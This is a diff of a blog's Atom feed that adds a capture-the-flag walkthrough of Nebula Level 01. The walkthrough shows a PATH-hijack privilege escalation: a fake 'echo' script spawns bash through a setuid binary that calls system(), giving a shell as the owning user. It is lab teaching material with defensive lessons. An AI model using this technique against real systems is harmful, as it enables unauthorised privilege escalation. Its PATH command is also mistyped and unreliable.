@@ -1,5 +1,103 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-04-14T21:52:24-05:00</updated><id>/feed.xml</id><title type="html">mythicalbits.github.io</title><entry><title type="html">What is this thing?</title><link href="/2020/04/14/placeholder.html" rel="alternate" type="text/html" title="What is this thing?" /><published>2020-04-14T00:00:00-05:00</published><updated>2020-04-14T00:00:00-05:00</updated><id>/2020/04/14/placeholder</id><content type="html" xml:base="/2020/04/14/placeholder.html">&lt;h1 id=&quot;a-post-of-some-sort&quot;&gt;A post of some sort&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-04-20T22:07:45-05:00</updated><id>/feed.xml</id><title type="html">mythicalbits.github.io</title><entry><title type="html">Nebula Series - Level 01</title><link href="/2020/04/20/nebula-01.html" rel="alternate" type="text/html" title="Nebula Series - Level 01" /><published>2020-04-20T00:00:00-05:00</published><updated>2020-04-20T00:00:00-05:00</updated><id>/2020/04/20/nebula-01</id><content type="html" xml:base="/2020/04/20/nebula-01.html">&lt;p&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
+in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
+system race conditions.&lt;/p&gt;
 
-&lt;p&gt;This is a placeholder… More to come.&lt;/p&gt;
+&lt;p&gt;Level 01 introduces us to the concept of setuid and the dangers of trusting the user’s environment
+to invoke another executable from within our code.&lt;/p&gt;
 
-&lt;!--more--&gt;</content><author><name></name></author><summary type="html">A post of some sort This is a placeholder… More to come.</summary></entry></feed>
+&lt;!--more--&gt;
+
+&lt;p&gt;Ok, so the first thing to understand is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setgid&lt;/code&gt; are unix flags that allow us to
+run an executable with the permissions of the executables owner or group. If not designed properly,
+they can be used for privilege escalation.&lt;/p&gt;
+
+&lt;p&gt;Inspecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag01&lt;/code&gt; users home directory, we see a single executable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flag01&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can check the permissions with&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stat&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;%a&quot;&lt;/span&gt; /home/flag01/flag01
+
+4750
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The leading 4 indicates that the setuid permission is
+set.&lt;/p&gt;
+
+&lt;p&gt;Alternatively we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; and look for an ‘s’ in the executable position of the user permissions.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /home/flag01
+
+&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt; 1 flag01 level01 7322 2011-11-20 21:22 /home/flag01/flag01
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here we also see that the owner is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag01&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To make things a little easier for us, we’re also provided with the source code.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/env echo and now what?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see the application sets our &lt;em&gt;real&lt;/em&gt; user id and group id using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setresgid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setresuid&lt;/code&gt; to
+our &lt;em&gt;effective&lt;/em&gt; user id and group id which it gets with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getegid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geteuid&lt;/code&gt;. Then it calls
+“echo” using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The question is, which &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt;? Well, we can influence that by modifying our path.&lt;/p&gt;
+
+&lt;p&gt;Let’s create a new file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; in our home directory with the following contents&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Make sure it’s executable with&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /home/level01/echo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add our home directory to the front of our PATH so that our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; is the one that gets run&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All that’s left is to run the flag01 executable&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/home/flag01/flag01
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we will be presented with a bash shell as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag01&lt;/code&gt; user. To complete the level we use our escalated
+privileges to run getflag&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getflag
+
+&lt;span class=&quot;s2&quot;&gt;&quot;You have successfully executed getflag on a target account&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;before vanishing without a trace.&lt;/p&gt;
+
+&lt;p&gt;Lessons learned:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt; executables run with the permissions of the owner&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setgid&lt;/code&gt; executables run with the permissions of the group&lt;/li&gt;
+  &lt;li&gt;these flags are ignored for interpreted executables&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid/setgid&lt;/code&gt; executables can be exploited if not designed carefully&lt;/li&gt;
+  &lt;li&gt;relying on the user’s environment to run the intended executable using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; is unsafe&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file system race conditions. Level 01 introduces us to the concept of setuid and the dangers of trusting the user’s environment to invoke another executable from within our code.</summary></entry></feed>
